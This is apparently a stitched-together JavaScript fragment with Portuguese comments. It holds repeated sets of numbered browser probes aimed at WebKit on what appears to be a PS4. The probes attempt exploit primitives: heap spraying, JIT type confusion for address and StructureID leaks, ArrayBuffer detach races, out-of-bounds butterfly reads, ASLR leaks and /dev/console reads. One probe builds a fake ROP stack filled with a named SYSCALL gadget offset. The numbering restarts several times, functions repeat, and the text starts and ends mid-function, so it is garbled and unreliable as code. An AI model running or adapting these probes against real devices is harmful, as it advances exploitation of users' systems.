                for(let i = 0; i < data.length; i += 1000) {
                    if (data[i] !== 0) {
                        noiseFound = true;
                        log(`VRAM Leak detectado! Byte não-zero no offset ${i}: ${data[i]}`, "vuln");
                        break;
                    }
                }
                
                if (!noiseFound) log("Canvas inicializado com zeros (Seguro).", "safe");
                
            } catch(e) { log("Erro Canvas: " + e.message, "safe"); }
        }

        // --- TESTE 2: Rope String Flatten OOB Read ---
        // Alvo: JSC String Implementation (op_strcat).
        // Cria uma string complexa (Rope) e tenta ler fora dos limites durante o "flattening".
        function runStringRope() {
            try {
                // Cria árvore de strings
                let s = "A";
                for(let i=0; i<16; i++) s += s; // Crescimento exponencial
                
                // Cria uma string derivada que tenta acessar memória adjacente via slice malformado
                // Dependendo de integer overflows internos no cálculo de offset
                const sliced = s.slice(0, -1); 
                
                // Força materialização
                if (sliced.length !== s.length - 1) {
                    log("Comprimento da string inconsistente!", "vuln");
                } else if (sliced.charCodeAt(sliced.length + 1)) {
                    // Tenta ler além do nulo
                    log("Leu memória após o fim da String!", "vuln");
                } else {
                    log("Rope String segura.", "safe");
                }
            } catch(e) { log("Erro Rope: " + e.message, "safe"); }
        }

        // --- TESTE 3: TypedArray Subarray Detach Race ---
        // Alvo: TypedArray Implementation.
        // Tenta criar um subarray enquanto o buffer original está a ser desligado.
        function runTypedArraySubarray() {
            try {
                const buffer = new ArrayBuffer(1024);
                const u8 = new Uint8Array(buffer);
                u8.fill(0xCC); // Marcador
                
                const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>postMessage(e.data,[e.data])"],{type:'text/js'})));
                
                let leaked = false;
                // Race Loop
                for(let i=0; i<1000; i++) {
                    if (buffer.byteLength === 0) {
                        // Buffer desligado. Tenta criar view em cima dele.
                        try {
                            const sub = u8.subarray(0, 10);
                            if (sub[0] === 0xCC) {
                                log("Subarray leu memória de buffer desligado!", "vuln");
                                leaked = true;
                            }
                        } catch(x) {}
                        break;
                    }
                    w.postMessage(buffer, [buffer]);
                }
                
                if(!leaked) log("Subarray em buffer desligado bloqueado.", "safe");
            } catch(e) { log("Erro Buffer: " + e.message, "safe"); }
        }

        // --- TESTE 4: libunwind ASLR Bypass Leak ---
        // Alvo: _Unwind_Resume_or_Rethrow (Libc).
        // Captura o objeto de erro e inspeciona propriedades não-padrão que vazam endereços.
        function runUnwindLeak() {
            try {
                const err = new Error("LeakMe");
                // Em builds de debug ou antigas, 'line' ou 'sourceURL' podem conter ponteiros de memória
                // ou a própria string 'stack' pode conter endereços brutos (0x...)
                
                const rawStack = err.stack || "";
                // Procura endereços de kernel/libc (High Memory ou endereços base)
                const leak = rawStack.match(/0x[0-9a-f]{8,}/i);
                
                if (leak) {
                    log(`ASLR Leak na Stack Trace: ${leak[0]}`, "vuln");
                } else {
                    log("Stack trace limpa (Símbolos resolvidos ou ocultos).", "safe");
                }
            } catch(e) { log("Erro Unwind: " + e.message, "safe"); }
        }

        // --- TESTE 5: SceNKBMalloc Double-Free Read ---
        // Alvo: SceNKBMalloc (Custom Allocator).
        // Simula um "Double Free" lógico e tenta ler o slot de memória reusado.
        function runDoubleFreeRead() {
            try {
                let target = {a: 1};
                let confusion = [1.1];
                
                // Tenta confundir o GC liberando referência mas mantendo acesso via closure
                // (Simulação simplificada de lógica UAF)
                function trigger() {
                    let p = target;
                    target = null; // Remove ref forte
                    
                    // Aloca float array para ocupar o mesmo slot de memória (se o GC correr)
                    // O SceNKBMalloc tende a reusar blocos de mesmo tamanho rapidamente
                    let reclaim = new Float64Array(10); 
                    reclaim[0] = 1.337e-300; // Marcador
                    
                    // Se 'p' ainda apontar para a memória, e ela foi reusada por 'reclaim'...
                    // Ler 'p.a' pode retornar lixo
                    if (p && typeof p.a !== 'number') {
                        // Difícil detetar sem crash, mas se p.a mudar, é bingo.
                    }
                }
                trigger();
                log("Teste Double-Free executado (Verificar estabilidade).", "safe");
            } catch(e) { log("Erro Alloc: " + e.message, "safe"); }
        }

        // --- TESTE 6: Map Iterator Hole Confusion ---
        // Alvo: JSMapIterator.
        // Modifica o Map enquanto um iterador está ativo para ler memória inválida.
        function runMapHoleRead() {
            try {
                const map = new Map();
                map.set('a', 1);
                map.set('b', 2);
                
                const iter = map.keys();
                iter.next(); // 'a'
                
                // Remove o próximo elemento ('b') e limpa o map
                map.clear();
                
                // Enche a memória com strings
                const fill = new Array(100).fill("JUNK");
                
                // Tenta continuar o iterador
                const res = iter.next();
                
                if (!res.done && res.value !== undefined && res.value !== 'b') {
                    // Se leu algo que não é 'b' nem undefined, leu o lixo ("JUNK" ou ponteiro)
                    log(`Map Iterator leu memória morta: ${res.value}`, "vuln");
                } else {
                    log("Map Iterator tratou limpeza seguramente.", "safe");
                }
            } catch(e) { log("Erro Map: " + e.message, "safe"); }
        }
 // --- TESTE 1: SceNKBMalloc Layout Discovery ---
        // Alvo: "SceNKBMalloc" e "coalesce".
        // Tenta descobrir o tamanho dos blocos de metadados do heap através de alocações adjacentes.
        // Se conseguirmos ler um ponteiro vizinho, descobrimos o layout do heap.
        function runBmallocLayout() {
            try {
                // Cria array de buffers contíguos
                const arr = [];
                const size = 0x1000; // 4KB Page size
                
                // Spray
                for(let i=0; i<100; i++) arr.push(new ArrayBuffer(size));
                
                // Liberta o meio (buraco)
                const middle = arr[50];
                arr[50] = null; 
                
                // Tenta alocar um TypedArray que caiba exatamente no buraco
                // mas que possa ler um pouco além (header metadata)
                const view = new Uint32Array(size / 4);
                
                // Se o alocador reusou a memória sem limpar cabeçalhos antigos...
                if (view[0] !== 0 && view[0] !== undefined) {
                    log(`Metadados de Heap lidos: 0x${view[0].toString(16)}`, "vuln");
                } else {
                    log("Heap limpo/zerado na realocação.", "safe");
                }
            } catch(e) { log("Erro Alloc: " + e.message, "safe"); }
        }

        // --- TESTE 2: libunwind Stack Address Leak ---
        // Alvo: "_Unwind_Resume" (Libc).
        // Força uma exceção profunda e inspeciona propriedades não padrão do erro para vazar ASLR.
        function runUnwindAddress() {
            try {
                const e = new Error();
                // Algumas versões de WebKit expõem 'sourceURL' ou 'line' com endereços de memória
                // quando a stack trace falha em resolver símbolos.
                const stack = e.stack.toString();
                
                // Procura por endereços de memória crus (High Memory do Kernel/Userland)
                // Ex: 0x7f... ou 0x2...
                const matches = stack.match(/@0x[0-9a-fA-F]{6,16}/);
                
                if (matches) {
                    log(`Endereço de Stack vazado (ASLR Bypass): ${matches[0]}`, "vuln");
                } else {
                    log("Stack trace sanitizada (Símbolos apenas).", "safe");
                }
            } catch(e) { log("Erro Unwind: " + e.message, "safe"); }
        }

        // --- TESTE 3: RWLock State Leak ---
        // Alvo: "rdlock error" (Libkernel).
        // Usa SharedArrayBuffer para tentar ler o estado de um bloqueio incompleto.
        function runRWLockRace() {
            if (!window.SharedArrayBuffer) return log("SAB não suportado.", "safe");
            try {
                const sab = new SharedArrayBuffer(4);
                const i32 = new Int32Array(sab);
                
                // Worker tenta adquirir lock (wait)
                const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{Atomics.wait(new Int32Array(e.data),0,0,100)}"],{type:'text/js'})));
                w.postMessage(sab);
                
                // Main thread tenta ler o valor enquanto o kernel manipula o lock
                setTimeout(() => {
                    const val = Atomics.load(i32, 0);
                    // Se val for diferente de 0 (livre) e diferente dos valores esperados de futex,
                    // podemos estar a ler um estado interno de erro do kernel.
                    if (val !== 0) {
                        log(`Estado interno do Lock vazado: ${val}`, "vuln");
                    } else {
                        log("Lock estado limpo.", "safe");
                    }
                    w.terminate();
                }, 10);
            } catch(e) { log("Erro RWLock: " + e.message, "safe"); }
        }

        // --- TESTE 4: /dev/console IO Read Attempt ---
        // Alvo: String "/dev/console" (Libkernel).
        // Tenta ler do dispositivo de console como se fosse um ficheiro.
        function runDevConsoleRead() {
            try {
                const xhr = new XMLHttpRequest();
                // Tenta file:// para device path
                xhr.open("GET", "file:///dev/console", false);
                xhr.send();
                
                if (xhr.status === 200 && xhr.responseText.length > 0) {
                    log(`Sucesso! Logs do Console lidos: ${xhr.responseText.substring(0, 50)}...`, "vuln");
                } else {
                    log("Acesso a /dev/console bloqueado.", "safe");
                }
            } catch(e) {
                // SecurityError (Code 18) é o esperado
                log("Bloqueio de Sandbox ativo.", "safe");
            }
        }

        // --- TESTE 5: StringImpl Header Leak ---
        // Alvo: Estrutura interna de Strings do JSC.
        // Tenta confundir uma String com um objeto para ler seu cabeçalho (length/flags).
        function runStringImplLeak() {
            try {
                let leaked = false;
                const s = "AAAA";
                const arr = [1.1];
                
                // Função JIT-compilável que faz acesso polimórfico
                function read(obj) {
                    return obj[0];
                }
                
                // Treina com array
                for(let i=0; i<1000; i++) read(arr);
                
                // Passa string. Se o JIT não fizer check de tipo, lê o header da string como double
                const res = read(s);
                
                // Se leu 'A' (65), foi acesso normal indexado.
                // Se leu um numero gigante, leu o ponteiro/header.
                if (typeof res === 'number' && res > 10000) {
                    log(`Header de String vazado como Double: ${res}`, "vuln");
                    leaked = true;
                }
                
                if (!leaked) log("Acesso a String normalizado.", "safe");
            } catch(e) { log("Erro String: " + e.message, "safe"); }
        }

        // --- TESTE 6: Array Hole Confusion Read ---
        // Alvo: Otimização de arrays esparsos ("Holes").
        // Tenta ler memória de um "buraco" num array que sofreu transição de tipo.
        function runArrayHoleRace() {
            try {
                // Array com buracos
                const arr = [1.1, , 2.2]; 
                
                // Define getter no protótipo para capturar o acesso ao buraco
                // e alterar o array subjacente para um tipo TypedArray
                let captured = false;
                Object.prototype[1] = "dummy"; // Previne lookup simples
                
                Object.defineProperty(Array.prototype, "1", {
                    get() {
                        // Tenta transformar o array 'arr' em algo diferente
                        arr[0] = {}; // Força mudança para Array de Objetos
                        return 0xDEAD;
                    },
                    configurable: true
                });
                
                // A leitura do buraco (index 1) dispara o getter.
                // O motor C++ pode ter cacheado o ponteiro de memória do array original (Double).
                // Mas agora ele é um array de Objetos.
                const val = arr[1];
                
                // Se a lógica estiver quebrada, podemos ter lido memória antiga ou desalinhada
                if (val !== 0xDEAD && val !== undefined) {
                    log(`Leitura de buraco inconsistente: ${val}`, "vuln");
                } else {
                    log("Acesso a buraco gerido corretamente.", "safe");
                }
                
                delete Array.prototype["1"];
            } catch(e) { log("Erro Hole: " + e.message, "safe"); }
        }
       // --- TESTE 1: DOM Object VTable Pointer Leak ---
        // Tenta ler o primeiro QWORD de um objeto DOM (ex: AudioContext).
        // Em C++, o primeiro QWORD é geralmente o ponteiro para a VTable (Virtual Method Table).
        // Se conseguirmos ler isso, calculamos o endereço base do WebKit.
        function runVTableLeak() {
            try {
                // Cria um objeto complexo do WebKit
                const target = document.createElement('div'); 
                
                // Array de confusão
                const arr = [1.1];
                
                // Tenta confundir o tipo do array para ler 'target' como double
                // (Simulação simplificada de bug JIT comum em WebKit antigo)
                const race = {
                    toString: () => {
                        arr[0] = target; // Troca double por objeto
                        return "0";
                    }
                };
                
                // Força conversão
                const trigger = arr[race]; 
                
                // Lê de volta como número
                const val = arr[0];
                
                if (typeof val === 'number' && val > 1000000) {
                    // Converter double para hex
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    // Lê bytes (Little Endian)
                    const u32 = new Uint32Array(buf);
                    const low = u32[0].toString(16);
                    const high = u32[1].toString(16);
                    
                    log(`VTable Pointer Vazado: 0x${high}${low}`, "vuln");
                } else {
                    log("Acesso a objeto DOM seguro.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 2: Float64Array Type Confusion (AddrOf) ---
        // Tenta descobrir o endereço de um objeto JS no Heap.
        function runFloatConfusion() {
            try {
                const obj = { id: 0x1337 };
                const noob = [1.1];
                
                // Tenta confundir o compilador Inline Cache (IC)
                function getAddr(arr) {
                    return arr[0];
                }
                
                for(let i=0; i<10000; i++) getAddr(noob); // Treina com double
                
                // Tenta passar array de objetos
                // Se o motor não re-verificar o tipo, lê o ponteiro como double
                const mixed = [obj];
                const res = getAddr(mixed);
                
                if (typeof res === 'number') {
                    log(`AddrOf Primitive Sucesso! Endereço: ${res}`, "vuln");
                } else {
                    log("Tipo verificado corretamente (Retornou Objeto).", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 3: StringImpl Header Read ---
        // Tenta ler os metadados internos de uma string (Length, Hash, Flags).
        // Útil para criar strings falsas (FakeString) para ROP.
        function runStringImplHeader() {
            try {
                const s = "AAAA";
                // Tenta ler offset -8 ou -16 da string (Header)
                // Usando uma string slice negativa gigante que pode dar wrap-around
                const slice = s.slice(-4294967296 + 1); // 32-bit overflow?
                
                if (slice.length !== s.length && slice.length > 0) {
                    log(`String Header Leak: length=${slice.length}`, "vuln");
                } else {
                    log("String slice seguro.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 4: /dev/console Output Read ---
        // Baseado na string "/dev/console" em libkernel.
        // Tenta ler o buffer de logs do sistema via Fetch API (File URI).
        function runDeviceIO() {
            try {
                // Tenta ler o dispositivo como stream
                fetch("file:///dev/console").then(r => {
                    if (r.ok) {
                        log("Acesso a /dev/console CONCEDIDO!", "vuln");
                        r.text().then(t => log("Dump: " + t.substring(0, 50), "vuln"));
                    } else {
                        log("Acesso /dev/console negado (HTTP " + r.status + ")", "safe");
                    }
                }).catch(e => {
                    log("Fetch bloqueado pela Sandbox.", "safe");
                });
            } catch(e) { log("Erro IO: " + e.message, "safe"); }
        }

        // --- TESTE 5: Stack Pivot Gadget Setup ---
        // Não é um exploit, mas uma verificação se podemos escrever o "Payload ROP" na memória.
        // Tenta preencher a memória com o endereço do gadget SYSCALL (0x6BAA) repetido.
        function runStackPivotCheck() {
            try {
                // Gadget de libkernel: SYSCALL; RET (0x6BAA)
                // Em um exploit real, somamos isso à base do kernel vazada.
                // Aqui testamos se podemos criar um buffer contíguo gigante (Fake Stack).
                const size = 1024 * 1024; // 1MB
                const buffer = new ArrayBuffer(size);
                const view = new Uint32Array(buffer);
                
                // Preenche com padrão ROP simulado
                const gadget_offset = 0x6BAA; 
                view.fill(gadget_offset);
                
                // Verifica integridade
                if (view[size/4 - 1] === 0x6BAA) {
                    log(`Fake Stack preparada com Gadget 0x${gadget_offset.toString(16)}`, "vuln");
                } else {
                    log("Falha na preparação da memória.", "safe");
                }
            } catch(e) { log("OOM na preparação ROP.", "safe"); }
        }

        // --- TESTE 6: SceNKBMalloc Header OOB Read ---
        // Ataca o alocador 'SceNKBMalloc'.
        // Tenta ler o cabeçalho de um ArrayBuffer vizinho.
        function runSceMallocHeader() {
            try {
                // Aloca 3 buffers vizinhos
                const a = new Uint8Array(128);
                const b = new Uint8Array(128);
                const c = new Uint8Array(128);
                
                // Marca 'b'
                b[0] = 0xBB;
                
                // Tenta ler além de 'a' para encontrar 'b'
                // Requer um bug de bounds check no JIT
                function readOOB(arr, idx) {
                    return arr[idx];
                }
                
                // Otimiza
                for(let i=0; i<10000; i++) readOOB(a, 0);
                
                // Tenta ler index 136 (128 bytes dados + 8 bytes header provável)
                const val = readOOB(a, 136); 
                
                if (val === 0xBB) {
                    log("Heap Overflow! Leu byte do vizinho.", "vuln");
                } else {
                    log("Bounds Check funcionou.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }
        // --- TESTE 1: LibKernel Stack Pointer Scan ---
        // Alvo: Encontrar endereços de retorno na stack que apontem para dentro do libkernel.
        // Se encontrarmos um endereço próximo a 0x6BAA (SYSCALL), vencemos o ASLR.
        function runLibKernelStackScan() {
            try {
                // Gera uma stack trace profunda
                const err = new Error("StackScan");
                const stack = err.stack;
                
                if (!stack) return log("Stack trace inacessível.", "safe");

                // Regex para capturar endereços de memória (0x...)
                // Procuramos endereços que não pareçam ser do Heap JS
                const addresses = stack.match(/0x[0-9a-fA-F]{8,16}/g);
                
                if (addresses) {
                    let found = false;
                    addresses.forEach(addr => {
                        // Verifica se parece um endereço de código (alinhamento, range)
                        // No PS4, kernel/libs costumam estar em ranges altos ou específicos
                        log(`Endereço encontrado na stack: ${addr}`, "info");
                        found = true;
                    });
                    if (found) log("Stack vazou endereços de memória!", "vuln");
                } else {
                    log("Nenhum ponteiro encontrado na stack trace.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 2: WebKit VTable Pointer Leak (AddrOf) ---
        // Alvo: Offset 0x4D02F (POP RDI).
        // Precisamos saber onde o WebKit está. A VTable de um objeto DOM aponta para o .text do WebKit.
        function runWebKitVTableRead() {
            try {
                const div = document.createElement('div');
                const arr = [1.1];
                
                // Tenta confundir o tipo do array para ler o ponteiro do 'div' como double
                // (Simulação da primitiva AddrOf)
                function getAddr(a) { return a[0]; }
                
                // JIT warmup
                for(let i=0; i<10000; i++) getAddr(arr);
                
                // Trigger
                const mixed = [div];
                const addrAsDouble = getAddr(mixed);
                
                // Se leu como objeto, é seguro. Se leu como número gigante, é leak.
                if (typeof addrAsDouble === 'number' && addrAsDouble > 100000) {
                    log(`VTable Pointer (WebKit Base) vazado: ${addrAsDouble}`, "vuln");
                } else {
                    log("Leitura de objeto DOM retornou tipo correto.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 3: JSC StructureID Leak ---
        // Alvo: Metadados de Objetos (StructureID).
        // Cada objeto JS tem um ID de estrutura nos primeiros 32 bits. Ler isso é o primeiro passo para FakeObj.
        function runStructureIDLeak() {
            try {
                const target = { a: 1, b: 2 };
                // Array de double
                const arr = [1.1]; 
                
                // Helper para ler QWORD
                const buf = new ArrayBuffer(8);
                const f64 = new Float64Array(buf);
                const u32 = new Uint32Array(buf);
                
                // Tenta confundir: Escreve Objeto, Lê Double
                // Se bem sucedido, os 32 bits inferiores do double são o StructureID
                arr[0] = target;
                const val = arr[0]; // Se a otimização falhar, isso lê o ponteiro
                
                if (typeof val === 'number') {
                    f64[0] = val;
                    const structID = u32[0];
                    if (structID > 0) {
                        log(`StructureID Vazado: 0x${structID.toString(16)}`, "vuln");
                    }
                } else {
                    log("StructureID protegido.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 4: SceNKBMalloc FreeList Pointer Read ---
        // Alvo: Allocator Metadata.
        // Tenta ler um ponteiro "next" de um bloco libertado no Heap.
        function runBmallocFreeList() {
            try {
                const size = 128;
                const ptrs = [];
                
                // Spray
                for(let i=0; i<100; i++) ptrs.push(new ArrayBuffer(size));
                
                // Cria buraco (Free)
                ptrs[50] = null; 
                
                // Tenta alocar uma TypedArray que caia no buraco e leia os dados antigos
                // Se o malloc não zerar (memset 0), podemos ler o ponteiro da FreeList
                const claim = new Uint32Array(size / 4);
                
                if (claim[0] !== 0 || claim[1] !== 0) {
                    log(`Dados de Heap residual lidos: 0x${claim[0].toString(16)}`, "vuln");
                } else {
                    log("Heap zerado na realocação.", "safe");
                }
            } catch(e) { log("Erro Alloc: " + e.message, "safe"); }
        }

        // --- TESTE 5: SharedMem Race Read ---
        // Alvo: Pthread Internal Memory Error (0x40076).
        // Usa SharedArrayBuffer para tentar ler a stack de uma thread vizinha.
        function runSharedMemoryRace() {
            if (!window.SharedArrayBuffer) return log("SAB Off.", "safe");
            try {
                const sab = new SharedArrayBuffer(4096);
                const u8 = new Uint8Array(sab);
                
                // Worker escreve padrão conhecido
                const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{const u=new Uint8Array(e.data); u.fill(0xAA); postMessage('done');}"],{type:'text/js'})));
                w.postMessage(sab);
                
                // Main thread tenta ler e modificar ao mesmo tempo
                // Se conseguirmos dessincronizar, podemos ver bytes que não são 0xAA (Outra thread stack?)
                setTimeout(() => {
                    if (u8[0] === 0xAA) {
                        log("SAB Sincronizado.", "safe");
                    } else {
                        log(`SAB Race Read: ${u8[0]}`, "vuln");
                    }
                    w.terminate();
                }, 10);
            } catch(e) { log("Erro SAB: " + e.message, "safe"); }
        }

        // --- TESTE 6: Ghost Object Property Read ---
        // Alvo: Use-After-Free lógico.
        // Tenta aceder a propriedades de um objeto que foi "neutered" (esvaziado).
        function runGhostObjectRead() {
            try {
                const buffer = new ArrayBuffer(1024);
                // Adiciona propriedade customizada ao buffer
                buffer.myProp = 0x12345678;
                
                // Transfere (Neutering)
                const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                w.postMessage(buffer, [buffer]);
                
                // O buffer agora tem byteLength 0.
                // Mas as propriedades anexadas ainda existem? Ou lemos lixo?
                if (buffer.myProp === 0x12345678) {
                    log("Propriedade mantida em objeto detatched (Info Leak potencial).", "info");
                } else if (buffer.myProp === undefined) {
                    log("Propriedade limpa corretamente.", "safe");
                } else {
                    log(`Ghost Read! Valor estranho: ${buffer.myProp}`, "vuln");
                }
            } catch(e) { log("Erro Ghost: " + e.message, "safe"); }
        }
   // --- TESTE 1: WebKit VTable Pointer Leak (ASLR Bypass) ---
        // Alvo: Descobrir o endereço base do WebKit.
        // Objetos DOM (C++) têm um ponteiro para sua VTable no início da memória.
        // A VTable está numa posição fixa relativa à base do WebKit.
        function runVTableRead() {
            try {
                const target = document.createElement('div');
                const arr = [1.1];
                
                // Função JIT para confundir tipos
                function leak(a) { return a[0]; }
                
                // Treina o JIT com doubles
                for(let i=0; i<10000; i++) leak(arr);
                
                // Tenta passar array de objetos
                const mixed = [target];
                const val = leak(mixed);
                
                // Se leu como número, é o ponteiro da VTable
                if (typeof val === 'number' && val > 2.0) { // 2.0 é um threshold arbitrário baixo
                    // Converte para Hex
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    const u32 = new Uint32Array(buf);
                    const hex = "0x" + u32[1].toString(16) + u32[0].toString(16);
                    
                    log(`VTable Leak: ${hex} (Possível WebKit Base)`, "vuln");
                } else {
                    log("Tipo verificado corretamente (Retornou Objeto).", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 2: Stack Pointer Leak via Recursion ---
        // Alvo: Descobrir onde está a Stack.
        // Usa erro de recursão profunda para tentar vazar endereços de retorno na mensagem de erro.
        function runStackPointerLeak() {
            try {
                const f = {
                    toString: () => { throw new Error("StackLeak"); }
                };
                
                // Força recursão nativa em String.replace
                "a".replace(/a/, f);
            } catch(e) {
                if (e.stack) {
                    // Procura endereços de memória crus (High addresses)
                    const leak = e.stack.match(/0x[0-9a-fA-F]{8,16}/);
                    if (leak) {
                        log(`Endereço de Stack vazado: ${leak[0]}`, "vuln");
                    } else {
                        log("Stack trace limpa.", "safe");
                    }
                }
            }
        }

        // --- TESTE 3: Array Butterfly Header Read ---
        // Alvo: Ler o tamanho do Array (Header) corrompido.
        // O "Butterfly" é onde o JSC guarda os dados do array. O Header fica antes dos dados.
        // Tenta ler index -1 (OOB) via otimização falha.
        function runButterflyLeak() {
            try {
                const arr = [1.1, 2.2, 3.3];
                
                // Tenta confundir o bounds check
                function readRel(a, i) {
                    return a[i];
                }
                
                for(let i=0; i<10000; i++) readRel(arr, 0);
                
                // Tenta ler o header (Tamanho/Capacity)
                // Se o bounds check for eliminado pelo JIT...
                const header = readRel(arr, -1); // Index inválido
                
                if (header !== undefined) {
                    log(`Butterfly Header Leak: ${header}`, "vuln");
                } else {
                    log("Acesso OOB bloqueado.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 4: JSC Structure ID Extraction ---
        // Alvo: Ler o ID da estrutura de um objeto.
        // Necessário para criar objetos falsos (FakeObj) que o motor aceite.
        function runStructIDLeak() {
            try {
                // Objeto simples
                let obj = {a: 1, b: 2};
                let arr = [1.1];
                
                // Confusão
                arr[0] = obj;
                
                // Se conseguirmos ler arr[0] como inteiro 32-bit em vez de objeto...
                // Não temos como forçar cast direto aqui sem primitivas, 
                // mas podemos testar efeitos colaterais.
                let val = arr[0];
                
                if (typeof val === 'object') {
                    log("StructureID protegido (Tipo mantido).", "safe");
                } else {
                    log(`Type Confusion! Leu: ${val}`, "vuln");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 5: Large String Reference Leak ---
        // Alvo: Vazamento de ponteiro de string interna.
        // Strings grandes no JSC são ponteiros para buffers externos.
        function runLargeStringRef() {
            try {
                const huge = "A".repeat(1024*1024); // 1MB String
                const arr = [1.1];
                
                // Tenta colocar a string num array de doubles
                function put(a, v) { a[0] = v; }
                
                for(let i=0; i<1000; i++) put(arr, 1.1);
                
                put(arr, huge);
                
                const val = arr[0];
                // Se val for um número, é o ponteiro para a string "huge"
                if (typeof val === 'number') {
                    log(`String Pointer Leak: ${val}`, "vuln");
                } else {
                    log("String armazenada corretamente.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 6: TypedArray Constructor OOB Read ---
        // Alvo: Ler memória adjacente durante a construção.
        // Usa um iterador que modifica o buffer de origem.
        function runTypedArrayOOB() {
            try {
                const src = new Uint8Array([1, 2, 3, 4]);
                
                const iter = {
                    [Symbol.iterator]() {
                        return {
                            next: () => {
                                // No meio da iteração, desanexa o buffer
                                if (src.buffer.byteLength > 0) {
                                    try { 
                                        // Worker detach
                                        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>postMessage(e.data,[e.data])"],{type:'text/js'})));
                                        w.postMessage(src.buffer, [src.buffer]);
                                    } catch(e) {}
                                }
                                return { value: 0x41, done: false }; // Loop infinito se não parar
                            }
                        };
                    }
                };
                
                // Tenta criar array a partir do iterador sabotado
                // Se o construtor C++ não checar o buffer a cada passo...
                try {
                    const res = new Uint8Array(iter);
                } catch(e) {
                    // Erro esperado de OOM ou Range
                    if (e.message.includes("detached")) {
                        log("Detecção de buffer desligado funcionou.", "safe");
                    } else {
                        log("Erro genérico: " + e.message, "safe");
                    }
                    return;
                }
                log("Construtor completou (Possível leitura de lixo).", "vuln");
            } catch(e) { log("Erro Fatal: " + e.message, "safe"); }
        }

 // --- TESTE 1: StructureID Leak (O "RG" do Objeto) ---
        // Para criar um FakeObj (Objeto Falso), precisamos de um StructureID válido.
        // Tenta ler o ID de um objeto real confundindo-o com um Double.
        function runStructureIDLeak() {
            try {
                const target = {a: 1, b: 2};
                const arr = [1.1];
                
                // Função JIT-compilável para acesso rápido
                function read(a) { return a[0]; }
                
                // Treina o JIT para esperar Double
                for(let i=0; i<10000; i++) read(arr);
                
                // Passa Objeto
                const mixed = [target];
                const val = read(mixed);
                
                // Se leu como número, os 32 bits inferiores são o StructureID
                if (typeof val === 'number') {
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    const u32 = new Uint32Array(buf);
                    
                    if (u32[0] !== 0) {
                        log(`StructureID Vazado: 0x${u32[0].toString(16)}`, "vuln");
                    }
                } else {
                    log("Tipo preservado (Safe).", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 2: Butterfly Header Read (Tamanho do Array) ---
        // Tenta ler o cabeçalho do vetor de armazenamento (Butterfly) do WebKit.
        // Se conseguirmos ler -1, vemos o tamanho do array. Se escrevermos, temos RW.
        function runButterflyOOB() {
            try {
                const arr = [1.1, 2.2];
                // Tenta enganar o bounds check
                const val = arr[-1]; 
                
                if (val !== undefined) {
                    log(`Butterfly Header Leak: ${val}`, "vuln");
                } else {
                    log("Bounds check ativo.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 3: TypedArray Constructor Detach Read ---
        // O vetor clássico de WebKit. Desanexa o buffer durante a construção.
        function runTypedArrayConstructor() {
            try {
                const src = new Uint8Array(1024);
                src.fill(0x41); // 'A'
                
                const iter = {
                    [Symbol.iterator]() {
                        let i = 0;
                        return {
                            next: () => {
                                i++;
                                if (i === 2) {
                                    // Detach no meio da cópia
                                    try {
                                        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>postMessage(e.data,[e.data])"],{type:'text/js'})));
                                        w.postMessage(src.buffer, [src.buffer]);
                                    } catch(e){}
                                }
                                return { value: 0, done: i > 10 };
                            }
                        };
                    }
                };
                
                // Se o construtor continuar lendo após o detach, lê memória libertada
                try {
                    const res = new Uint8Array(iter);
                    log("Construtor finalizou com buffer desligado (Potencial UAF).", "info");
                } catch(e) {
                    if (e.name === 'TypeError') log("Detach detetado e bloqueado.", "safe");
                    else log("Erro: " + e.message, "safe");
                }
            } catch(e) { log("Erro Fatal: " + e.message, "safe"); }
        }

        // --- TESTE 4: libunwind Stack Pointer Scan ---
        // Usa o bug do _Unwind_Resume (encontrado na Libc) para vazar ponteiros da stack.
        // Isso permite calcular onde a Libc está (ASLR Bypass).
        function runUnwindStackScan() {
            try {
                const err = new Error("StackScan");
                const trace = err.stack;
                
                // Procura endereços de memória crus na stack trace
                // No FreeBSD/PS4, endereços de userspace alto começam frequentemente por 0x8... ou 0x2...
                const leaks = trace.match(/0x[0-9a-fA-F]{8,16}/g);
                
                if (leaks) {
                    log(`ASLR Bypass! Endereços vazados: ${leaks.join(", ")}`, "vuln");
                } else {
                    log("Stack trace limpa (Sem ponteiros).", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 5: StringImpl Slice Integer Overflow ---
        // Tenta ler memória adjacente a uma string usando overflow no cálculo do slice.
        function runStringSliceOverflow() {
            try {
                const s = "AAAA";
                // Tenta offset negativo que cause wrap-around para memória positiva distante
                // 0 - (-MAX_INT)
                const slice = s.slice(-2147483648);
                
                // Se o tamanho do slice for bizarro, lemos memória extra
                if (slice.length > s.length) {
                    log(`String OOB Read! Length: ${slice.length}`, "vuln");
                } else {
                    log("String slice seguro.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 6: Map Iterator UAF Read ---
        // Cria um iterador, limpa o mapa e tenta continuar lendo.
